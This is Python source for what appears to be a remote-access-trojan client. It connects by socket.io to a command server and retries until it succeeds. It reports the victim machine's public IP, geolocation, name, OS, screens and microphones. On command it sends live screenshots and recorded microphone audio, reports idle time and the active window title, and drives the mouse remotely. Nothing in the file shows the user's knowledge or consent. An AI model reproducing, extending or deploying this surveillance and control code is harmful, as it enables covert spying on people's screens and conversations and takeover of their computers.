import socketio
import os

import platform
from requests import get
from win32api import GetTickCount, GetLastInputInfo
from win32gui import GetWindowText, GetForegroundWindow
from time import monotonic

from PIL import Image
import dxcam
from io import BytesIO
import base64
from pyautogui import click,rightClick,moveTo,mouseDown,mouseUp

import pyaudio
import wave 
p = pyaudio.PyAudio()


import re
from time import sleep

camera = dxcam.create()
sio = socketio.Client()
isConnected = 0

clientData = {}

@sio.on("getIdleTime")
def getIdleTime():
    idleTime = (GetTickCount() - GetLastInputInfo()) / 1000.0
    sio.emit("recvIdleTime",idleTime)

@sio.on("getUpTime")
def getUpTime():
    sio.emit("recvUpTime",monotonic())

@sio.on("getActiveWindow")
def getActiveWindow():
    fullWindow = GetWindowText(GetForegroundWindow())
    windowSplit = fullWindow.split(" - ")
    window = windowSplit[len(windowSplit)-1]
    if len(fullWindow)>30:
        fullWindow = window

    sio.emit("recvActiveWindow",fullWindow)

@sio.on('getping')
def getPing():
    sio.emit("pong")

@sio.on("updateParams")
def updateParams(params):
    for key in params:
        clientData[key] = params[key]

#acutal command function
@sio.on("sendClick")
def sendClick(coord):
    click(coord["x"],coord["y"])
@sio.on("mouseDown")
def mDown(coord):
    moveTo(coord["x"],coord["y"])
    sleep(0.05)
    mouseDown(coord["x"],coord["y"])
@sio.on("mouseUp")
def mUp(coord):
    moveTo(coord["x"],coord["y"])
    sleep(0.05)
    mouseUp(coord["x"],coord["y"])

@sio.on("sendRClick")
def sendClick(coord):
    moveTo(coord["x"],coord["y"])
    sleep(0.05)
    rightClick(coord["x"],coord["y"])

@sio.on("moveMouse")
def moveMouse(coord):
    moveTo(coord["x"],coord["y"])

@sio.on('screenshare')
def screenshare():
    quality = 25
    if "remoteDesktopQuality" in clientData:
        quality=int(clientData["remoteDesktopQuality"])-2
    
    try:
        frame = camera.grab()

        image = Image.fromarray(frame)
        image = image.reduce((50-quality))
        image = image.quantize(colors=256//2,method=2)
        buffered = BytesIO()
        image.save(buffered,format="PNG")
        img_str = base64.b64encode(buffered.getvalue())

        sio.emit("screenshare",img_str)

    except:
        sio.emit("screenshare","error")

@sio.event
def remoteMicrophone():
    chunk = 3200  # Record in chunks of 1024 samples
    sample_format = pyaudio.paInt16  # 16 bits per sample
    channels = 1
    fs = 8000 # Record at 44100 samples per second
    seconds = 3
    filename = "C:\\Users\\UTILIS~1\\AppData\\Local\\Temp\\microRecord.wav"

    print(clientData["defaultMic"])
    stream = p.open(format=sample_format,
                channels=channels,
                rate=fs,
                frames_per_buffer=chunk,
                input=True,
                input_device_index=int(clientData["defaultMic"]))

    frames = []

    for i in range(0, int(fs / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)


    stream.stop_stream()
    stream.close()
    
    wf = wave.open(filename, 'wb')
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(sample_format))
    wf.setframerate(fs)
    wf.writeframes(b''.join(frames))
    wf.close()

    with open(filename,"rb") as file:
        sio.emit("remoteMicrophone",[b"".join(file.readlines())])

            

@sio.event
def connect():
    global isConnected
    isConnected = 1
    
    print('connection established')
    
    clientData["ip"] = get('https://api64.ipify.org?format=json').json()['ip']
    clientData["loc"] = get(f'https://ipapi.co/{clientData["ip"]}/json/').json()


    deviceString = dxcam.output_info()
    resolution = re.findall("\(.*\)",deviceString)
    resolutionList = [[res.split(",")[0][1:],res.split(",")[1][:-1]] for res in resolution]

    defaultIndex = p.get_default_input_device_info().get("index")
    clientData["defaultMic"] = defaultIndex
    numdevices = p.get_host_api_info_by_index(0).get('deviceCount')
    micList = [p.get_device_info_by_host_api_device_index(0, i).get('name') for i in range(0, numdevices) if (p.get_device_info_by_host_api_device_index(0, i).get('maxInputChannels')) > 0] 
    micList[defaultIndex] = "!!!" + micList[defaultIndex]

    sio.emit('newClient', [{'name': os.environ["COMPUTERNAME"],
                            "ip":clientData["ip"],
                            "os":f"{platform.system()} {platform.release()}",
                            "loc":f'{clientData["loc"].get("city")} {clientData["loc"].get("country_name")}',
                            "ping":"0",
                            "idleTime":"Not idle",
                            "upTime":"00:00:00",
                            "activeWindow":"None"},
                            {"resolutionList":resolutionList, 
                            "microphoneList":micList}])

@sio.event
def disconnect():
    print('disconnected from server')

def connecting():
    while isConnected==0:
        try:
            sio.connect('http://localhost:5454')
            sio.wait()
        except Exception:
            pass

connecting()




